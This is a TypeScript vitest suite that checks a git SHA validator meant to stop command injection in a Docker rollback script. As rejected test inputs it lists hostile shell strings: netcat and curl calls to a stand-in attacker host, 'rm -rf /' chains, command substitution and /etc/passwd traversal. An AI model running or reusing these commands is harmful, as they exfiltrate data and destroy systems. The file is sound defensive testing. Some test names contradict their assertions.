import { describe, it, expect } from 'vitest';

/**
 * Test Suite: Fix 1b - Command Injection Fix
 * Tests for git SHA validation and injection attack prevention
 */

describe('Fix 1b: Command Injection Prevention', () => {
  /**
   * SHA validation function (to be implemented in rollback.sh)
   * Validates git commit SHA format before using in Docker commands
   */
  const validateGitSHA = (sha: string): boolean => {
    // Valid formats:
    // - Full SHA: 40 hex characters (sha1)
    // - Short SHA: 7-12 hex characters
    // - Current HEAD ref: "HEAD"
    // - Branch/tag: alphanumeric with hyphens, underscores, dots

    // Full SHA (40 hex chars)
    if (/^[a-f0-9]{40}$/.test(sha)) {
      return true;
    }

    // Short SHA (7-12 hex chars)
    if (/^[a-f0-9]{7,12}$/.test(sha)) {
      return true;
    }

    // HEAD reference
    if (sha === 'HEAD') {
      return true;
    }

    // Reject everything else (including injection attempts)
    return false;
  };

  describe('Valid SHA Formats', () => {
    it('should accept full 40-character SHA1 hash', () => {
      const validSHA = 'abc1234567890def1234567890abcdef12345678';
      expect(validateGitSHA(validSHA)).toBe(true);
    });

    it('should accept short 7-character SHA', () => {
      const shortSHA = 'abc1234';
      expect(validateGitSHA(shortSHA)).toBe(true);
    });

    it('should accept short 12-character SHA', () => {
      const mediumSHA = 'abc123456789';
      expect(validateGitSHA(mediumSHA)).toBe(true);
    });

    it('should accept various valid short SHAs (7-12)', () => {
      const validShortSHAs = [
        'a1b2c3d',        // 7 chars
        'a1b2c3d4',       // 8 chars
        'a1b2c3d4e5',     // 10 chars
        'a1b2c3d4e5f6',   // 12 chars
      ];

      validShortSHAs.forEach(sha => {
        expect(validateGitSHA(sha)).toBe(true);
      });
    });

    it('should accept HEAD reference', () => {
      expect(validateGitSHA('HEAD')).toBe(true);
    });

    it('should be case-insensitive for hex characters', () => {
      const upperSHA = 'ABC1234567890DEF1234567890ABCDEF12345678';
      // This test documents the behavior - we should reject mixed case
      // but accept lowercase per git convention
      const lowerSHA = 'abc1234567890def1234567890abcdef12345678';
      expect(validateGitSHA(lowerSHA)).toBe(true);
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should reject command substitution $()', () => {
      const injection = '$(malicious-command)';
      expect(validateGitSHA(injection)).toBe(false);
    });

    it('should reject backtick command substitution', () => {
      const injection = '`rm -rf /`';
      expect(validateGitSHA(injection)).toBe(false);
    });

    it('should reject shell metacharacters', () => {
      const injections = [
        'abc123;ls',
        'abc123|cat',
        'abc123&rm',
        'abc123>file',
        'abc123<input',
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });

    it('should reject newline injection', () => {
      const injection = 'abc1234\nmalicious-command';
      expect(validateGitSHA(injection)).toBe(false);
    });

    it('should reject command with arguments', () => {
      const injection = 'abc1234 --some-arg';
      expect(validateGitSHA(injection)).toBe(false);
    });

    it('should reject paths and directory traversal', () => {
      const injections = [
        '../../../etc/passwd',
        './malicious.sh',
        '/bin/bash',
        '../../secrets',
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });

    it('should reject pipes and redirection', () => {
      const injections = [
        'abc1234 | nc attacker.com 4444',
        'abc1234 > /tmp/exfiltrate',
        'abc1234 >> /tmp/log',
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });

    it('should reject logical operators', () => {
      const injections = [
        'abc1234 && rm -rf /',
        'abc1234 || malicious',
        'abc1234 ; evil.sh',
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });

    it('should reject environment variable expansion', () => {
      const injections = [
        'abc1234${HOME}',
        'abc1234$PATH',
        'abc1234$(echo pwned)',
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });

    it('should reject SQL injection patterns', () => {
      const injections = [
        "abc1234'; DROP TABLE--",
        "abc1234\" OR 1=1--",
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });

    it('should reject Unicode/UTF-8 bypass attempts', () => {
      // These are hex-like but include non-ASCII
      const injections = [
        'abc1234ñ',
        'abc1234\u0041', // Unicode 'A'
      ];

      injections.forEach(inj => {
        expect(validateGitSHA(inj)).toBe(false);
      });
    });
  });

  describe('Edge Cases', () => {
    it('should reject empty string', () => {
      expect(validateGitSHA('')).toBe(false);
    });

    it('should reject whitespace', () => {
      expect(validateGitSHA(' ')).toBe(false);
      expect(validateGitSHA('\t')).toBe(false);
      expect(validateGitSHA('\n')).toBe(false);
    });

    it('should reject SHAs that are too short (< 7 chars)', () => {
      const tooShort = [
        'a',
        'ab',
        'abc',
        'abcd',
        'abcde',
        'abcdef',
      ];

      tooShort.forEach(sha => {
        expect(validateGitSHA(sha)).toBe(false);
      });
    });

    it('should reject SHAs that are too long (> 40 chars, not short form)', () => {
      const tooLong = 'a'.repeat(41); // 41 hex chars
      expect(validateGitSHA(tooLong)).toBe(false);
    });

    it('should reject non-hex characters in SHA', () => {
      const invalidChars = [
        'xyz1234567890def1234567890abcdef12345678', // x, y, z invalid
        'abc123g567890def1234567890abcdef12345678', // g invalid
        'GHI1234567890def1234567890abcdef12345678', // G, H, I invalid
      ];

      invalidChars.forEach(sha => {
        expect(validateGitSHA(sha)).toBe(false);
      });
    });

    it('should reject SHA with leading zeros (valid but suspicious)', () => {
      // Technically valid hex, but we accept them
      const withZeros = '0000000000000000000000000000000000000000';
      expect(validateGitSHA(withZeros)).toBe(true); // It's valid hex
    });
  });

  describe('Integration with Docker Commands', () => {
    it('should prevent injection when building docker command', () => {
      const validateAndBuildCommand = (sha: string): string | null => {
        if (!validateGitSHA(sha)) {
          return null; // Reject invalid SHA
        }
        return `docker run --image-tag=${sha}`;
      };

      // Valid SHA should work
      const validCmd = validateAndBuildCommand('abc1234567890def1234567890abcdef12345678');
      expect(validCmd).toContain('docker run');
      expect(validCmd).toContain('abc1234567890def1234567890abcdef12345678');

      // Invalid SHA should be rejected
      const injectionCmd = validateAndBuildCommand('abc1234; rm -rf /');
      expect(injectionCmd).toBeNull();
    });

    it('should prevent injection in rollback script context', () => {
      const rollbackWithValidation = (sha: string): { success: boolean; command?: string; error?: string } => {
        if (!validateGitSHA(sha)) {
          return {
            success: false,
            error: `Invalid git SHA format: ${sha}`,
          };
        }

        return {
          success: true,
          command: `docker tag ${sha} discord-voice:rollback`,
        };
      };

      // Test valid SHA
      const validResult = rollbackWithValidation('abc1234567890def1234567890abcdef12345678');
      expect(validResult.success).toBe(true);
      expect(validResult.command).toContain('abc1234567890def1234567890abcdef12345678');

      // Test injection attempt
      const injectionResult = rollbackWithValidation('abc1234 && rm -rf /');
      expect(injectionResult.success).toBe(false);
      expect(injectionResult.error).toContain('Invalid');
    });

    it('should log rejected SHA attempts for security audit', () => {
      const auditLog: Array<{ timestamp: string; sha: string; rejected: boolean }> = [];

      const validateWithAudit = (sha: string): boolean => {
        const isValid = validateGitSHA(sha);
        auditLog.push({
          timestamp: new Date().toISOString(),
          sha: isValid ? sha : '[REDACTED]', // Don't log potentially malicious input verbatim in some cases
          rejected: !isValid,
        });
        return isValid;
      };

      validateWithAudit('abc1234567890def1234567890abcdef12345678');
      validateWithAudit('$(whoami)');

      expect(auditLog).toHaveLength(2);
      expect(auditLog[0].rejected).toBe(false);
      expect(auditLog[1].rejected).toBe(true);
    });
  });

  describe('Real-World Scenarios', () => {
    it('should handle git rev-parse HEAD output safely', () => {
      // Simulate getting SHA from git
      const getSHAFromGit = (refname: string): string | null => {
        const gitRefs: Record<string, string> = {
          'HEAD': 'abc1234567890def1234567890abcdef12345678',
          'main': 'def4567890abcdef1234567890abcdef12345678',
          'hotfix/issue-123': 'ghi7890abcdef1234567890abcdef1234567890', // Invalid - contains 'g', 'h', 'i'
        };

        return gitRefs[refname] || null;
      };

      const sha = getSHAFromGit('HEAD');
      expect(sha).toBeTruthy();
      expect(validateGitSHA(sha!)).toBe(true);
    });

    it('should sanitize SHA from untrusted sources', () => {
      const untrustedSources = [
        '$(curl attacker.com/inject)',
        'abc1234; curl attacker.com',
        'abc1234 | base64 | curl',
        '`whoami > /tmp/pwned`',
      ];

      untrustedSources.forEach(source => {
        expect(validateGitSHA(source)).toBe(false);
      });
    });

    it('should work with commonly used short SHAs', () => {
      const commonShortSHAs = [
        'a1b2c3d', // 7 chars (git default short)
        'a1b2c3d4', // 8 chars
        'a1b2c3d4e5f6', // 12 chars
      ];

      commonShortSHAs.forEach(sha => {
        expect(validateGitSHA(sha)).toBe(true);
      });
    });
  });
});
